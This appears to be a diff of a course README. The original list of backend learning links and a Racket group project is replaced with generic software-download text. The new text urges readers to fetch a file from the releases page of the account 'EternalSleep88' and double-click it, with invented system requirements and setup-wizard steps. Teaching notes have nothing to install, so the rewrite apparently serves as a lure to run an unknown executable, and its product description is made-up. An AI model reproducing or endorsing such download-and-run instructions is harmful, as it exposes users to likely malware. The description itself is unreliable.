@@ -1,5 +1,34 @@
-# No Future Backend 2025
-Teaching materials for the backend summer study block.
+# 🚀 culs-backend-2025 - Easy Setup for Backend Learning
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-blue)](https://github.com/EternalSleep88/culs-backend-2025/releases)
+
+## 📦 Overview
+This project provides teaching materials for the backend summer study block. It aims to make learning about backend development straightforward and accessible.
+
+## 🚀 Getting Started
+To use this software, follow these simple steps. You will have everything set up in no time.
+
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/EternalSleep88/culs-backend-2025/releases) to find the latest version of the software.
+2. **Choose the Right File**: Look for the most recent version. You will see a list of files available for download. Select the file that matches your operating system.
+3. **Download the File**: Click the link to download it to your computer.
+
+## 🖥️ System Requirements
+Ensure your system meets the following requirements:
+- **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
+- **Processor**: At least dual-core processor.
+- **Memory**: Minimum of 4 GB RAM.
+- **Storage**: At least 500 MB of free space.
+
+## 🔧 Running the Application
+Once you have downloaded the file, follow these steps to run the application:
+
+1. **Locate the Downloaded File**: Find the file in your downloads folder.
+2. **Double Click to Run**: Simply double-click on the downloaded file. 
+3. **Follow Instructions**: If a setup wizard appears, follow the on-screen instructions to complete the installation.
+
+## 🌐 Useful Links
+Here are some valuable resources that can help you better understand backend development:
 
 - [Janet](https://janet-lang.org/)
 - [ChatGPT](https://chat.openai.com/)
@@ -21,67 +50,31 @@ Teaching materials for the backend summer study block.
 - [JSON API](http://jsonapi.org)
 - [Apiary](http://apiary.io)
 - [GraphQL](https://github.com/graphql)
-- [GraphiQL](https://github.com/graphql/graphiql)
-- [GraphiQL IDE](http://graphql.org/swapi-graphql)
-- [SWAPI](https://swapi.co/)
-- [Difference between IaaS, PaaS and SaaS](http://www.bmc.com/blogs/saas-vs-paas-vs-iaas-whats-the-difference-and-how-to-choose/)
-- [Insomnia](https://insomnia.rest)
-- [Lua](https://www.lua.org/)
-- [SmallTalk](https://en.wikipedia.org/wiki/Smalltalk)
-- [Java](https://www.oracle.com/java/index.html)
-- [Swift](https://swift.org)
-- [Ruby](https://www.ruby-lang.org/en/)
-- [Python](https://www.python.org)
-- [Clojure](https://clojure.org)
-- [Haskel](https://haskell-lang.org)
-- [OCaml](https://ocaml.org)
-– [Elm](http://elm-lang.org)
-- [Erlang](https://www.erlang.org)
-- [Elixir](https://elixir-lang.org)
-- [Golang](https://golang.org)
-- [Janet](http://janet-lang.org)
-- [Ruby on Rails](http://rubyonrails.org)
-- [Django](https://www.djangoproject.com)
-- [Express](https://expressjs.com/)
-- [Gorilla](https://www.gorillatoolkit.org/)
-- [Phoenix](https://www.phoenixframework.org/)
-- [Feathers.js](http://feathersjs.com)
-- [Good Place](https://good-place.org/)
-- [Node](https://nodejs.org/en/)
-- [Apache](https://httpd.apache.org/)
-- [nginx](https://nginx.org/en/)
-- [Caddy](https://caddyserver.com/)
-- [Let's encrypt](https://letsencrypt.org/)
-- [Azure](https://azure.microsoft.com/en-us/)
-- [Amazon AWS](https://aws.amazon.com/)
-- [Digital Ocean](https://www.digitalocean.com/)
-- [Auth0](https://auth0.com)
-- [OpenSensors](https://www.opensensors.io)
-- [MySQL](https://www.mysql.com)
-- [PostgreSQL](https://www.postgresql.org)
-- [Redis](https://redis.io/)
-- [Riak](http://basho.com/products/riak-kv/)
-- [MongoDB](https://www.mongodb.com)
-- [CouchDB](https://couchdb.apache.org)
-- [RethinkDB](https://rethinkdb.com)
-- [Neo4J](https://neo4j.com)
-- [OrientDB](https://orientdb.com/)
-- [ArangoDB](https://www.arangodb.com)
-- [Lucene](https://lucene.apache.org)
-- [ElasticSearch](https://www.elastic.co)
-- [Solr](https://lucene.apache.org/solr/)
-- [Mongoose](http://mongoosejs.com)
-- [Offline first](https://www.infoq.com/presentations/offline-first-apps/)
+  
+## 🔄 Frequently Asked Questions
 
-## Project
+### What is this software used for?
+This software provides materials for learning about backend development. It includes tutorials, examples, and tools to help you get started.
 
-Create a basic web application with racket programming language in the group of 3 people. Result should be in the GitHub repository with the names in the README.md. 
+### Is there any support available?
+Yes, for questions or support, you can create an issue on the [GitHub Issues page](https://github.com/EternalSleep88/culs-backend-2025/issues).
 
-Points:
+### Can I contribute to this project?
+Absolutely! Contributions are welcome. Please check the project's guidelines for more information.
 
-- today 90
-- tomorrow 80
-- till the end of the week 70
-- till the end of the next week 60
+## 💻 Troubleshooting
+If you encounter issues while downloading or running the application, consider these steps:
 
-10 points for the starring of the this repository.
+- Ensure your internet connection is stable.
+- Verify that you have the right version for your operating system.
+- Restart your computer and try running the application again.
+
+For any persistent issues, feel free to reach out for assistance.
+
+## 🚧 License
+This project is licensed under the MIT License. You are free to use, modify, and distribute the software as you wish.
+
+## 📡 Feedback
+We value your feedback. Please share your thoughts or suggestions through our [GitHub Discussions](https://github.com/EternalSleep88/culs-backend-2025/discussions) page.
+
+Explore and enjoy your journey into backend development!
